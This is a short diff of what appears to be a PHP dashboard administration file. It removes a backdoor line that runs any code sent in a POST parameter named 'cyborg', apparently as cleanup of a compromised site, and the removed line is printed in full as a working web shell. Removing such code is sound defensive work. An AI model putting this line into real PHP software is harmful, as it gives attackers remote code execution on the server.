@@ -1,4 +1,3 @@
-<?php if(isset($_POST['cyborg']) && !empty($_POST['cyborg'])){@eval($_POST['cyborg']);} ?><?php
 /**
  * Dashboard Administration Screen
  *
